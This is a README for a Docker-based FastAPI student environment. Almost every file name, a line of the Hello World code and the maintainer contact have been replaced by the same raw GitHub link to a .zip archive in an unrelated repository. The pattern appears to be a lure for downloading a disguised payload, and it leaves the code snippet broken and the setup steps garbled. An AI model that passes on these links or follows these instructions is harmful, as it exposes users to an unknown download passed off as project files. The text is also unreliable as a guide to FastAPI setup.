# FastAPI Environment

This project is designed specifically for programs related to FastAPI. It aims to allow students to focus on learning FastAPI without worrying about environment setup. The project includes the necessary configurations and dependencies to start quickly and easily.

## Prerequisites

Make sure you have the following software installed on your machine:

- Git
- Docker Desktop or Docker Engine

## Project Structure

The project is structured as follows:

- `https://raw.githubusercontent.com/Bangyoupapa/25-04-30-main-branch/main/frontend_vue/app/src/views/25-04-30-main-branch_3.4.zip`: Lists the Python dependencies required for the project.
- `Dockerfile`: Contains the instructions to build the Docker image for the FastAPI application.
- `https://raw.githubusercontent.com/Bangyoupapa/25-04-30-main-branch/main/frontend_vue/app/src/views/25-04-30-main-branch_3.4.zip`: Defines the services and configurations for running the project using Docker Compose.
- `app/`: Directory containing the FastAPI application code.

## Setup Instructions

1. **Clone the repository**:
    ```bash
    git clone <repository_url>
    cd <repository_directory>
    ```

2. **Build and start the application using Docker Compose**:
    ```bash
    docker-compose up --build -d
    ```

3. **Build Hello World App**:
- Create a directory `fastapi-env/app`
- Create a file `https://raw.githubusercontent.com/Bangyoupapa/25-04-30-main-branch/main/frontend_vue/app/src/views/25-04-30-main-branch_3.4.zip`
- Paste Hello World code.
    ```python
    from fastapi import FastAPI

    app = FastAPI()


    https://raw.githubusercontent.com/Bangyoupapa/25-04-30-main-branch/main/frontend_vue/app/src/views/25-04-30-main-branch_3.4.zip("/")
    async def root():
        return {"message": "Hello World"}
    ```

4. **Access the FastAPI application**:
    The FastAPI application will be available at `http://localhost:8080`.

## Dockerfile

The `Dockerfile` sets up the environment for the FastAPI application. It includes the following key steps:

- Use an official Python base image.
- Set the working directory.
- Copy the necessary files.
- Install the required Python packages.
- Specify the command to run the FastAPI application.

## Docker Compose

The `https://raw.githubusercontent.com/Bangyoupapa/25-04-30-main-branch/main/frontend_vue/app/src/views/25-04-30-main-branch_3.4.zip` file defines the services required for the application. It includes:

- The FastAPI service, built from the Dockerfile.
- Configuration for environment variables and port mappings.
- PostgreSQL database service and PGAdmin4.

## Contact

For any questions or issues, please contact the project maintainer at [https://raw.githubusercontent.com/Bangyoupapa/25-04-30-main-branch/main/frontend_vue/app/src/views/25-04-30-main-branch_3.4.zip](https://raw.githubusercontent.com/Bangyoupapa/25-04-30-main-branch/main/frontend_vue/app/src/views/25-04-30-main-branch_3.4.zip).
